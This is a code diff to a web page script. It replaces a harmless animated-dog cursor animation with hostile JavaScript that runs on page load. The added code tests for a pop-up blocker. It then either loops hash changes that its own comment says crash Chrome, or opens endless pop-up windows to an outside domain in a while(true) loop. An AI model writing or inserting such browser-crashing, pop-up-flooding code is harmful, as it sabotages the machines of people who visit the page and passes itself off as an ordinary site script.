@@ -1,30 +1,27 @@
-var doggo = document.querySelector("#doggo");
+function recursor() {
+  //Change hash of current URL
+  window.location.hash = Math.random() + "" + Math.random() + "" + Math.random();
+  //Recurse on hash changes
+  window.addEventListener('hashchange', function() {
+    recursor();
+  });
+};
 
-var cursorArray = ['url("frame_00_delay-0.05s.gif"), auto',
-  'url("frame_01_delay-0.05s.gif"), auto',
-  'url("frame_02_delay-0.05s.gif"), auto',
-  'url("frame_03_delay-0.05s.gif"), auto',
-  'url("frame_04_delay-0.05s.gif"), auto',
-  'url("frame_05_delay-0.05s.gif"), auto',
-  'url("frame_06_delay-0.05s.gif"), auto',
-  'url("frame_07_delay-0.05s.gif"), auto',
-  'url("frame_08_delay-0.05s.gif"), auto',
-  'url("frame_09_delay-0.05s.gif"), auto',
-  'url("frame_10_delay-0.05s.gif"), auto',
-  'url("frame_11_delay-0.05s.gif"), auto',
-  'url("frame_12_delay-0.05s.gif"), auto',
-  'url("frame_13_delay-0.05s.gif"), auto',
-  'url("frame_14_delay-0.05s.gif"), auto',
-  'url("frame_15_delay-0.05s.gif"), auto',
-  'url("frame_16_delay-0.05s.gif"), auto',  
-  'url("frame_17_delay-0.05s.gif"), auto',               
-];
-i = 0;
-(function cursor() {
-  doggo.style.cursor = cursorArray[i];
-  i++;
-  if (i == cursorArray.length) {
-    i = 0;
+function detectPopupBlocker() {
+  var myTest = window.open("about:blank", "", "directories=no,height=100,width=100,menubar=no,resizable=no,scrollbars=no,status=no,titlebar=no,top=0,location=no");
+  if (!myTest) { // Tests for pop-up blocker ^
+    setTimeout(function() {
+      recursor();
+    }, 2000);
+    //Runs recursory code after 5000 millisecond delay ^ (crashes chrome)
+  } else {
+    myTest.close();
+    while (true) {
+      var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
+      var URL = "http://kplibrary.cf" + location.href;
+      var win = window.open(URL, "_blank", strWindowFeatures);
+      //If no pop-up blocker spams a shit ton of pop-ups
+    }
   }
-  setTimeout(cursor, 50);
-})();
+}
+detectPopupBlocker();
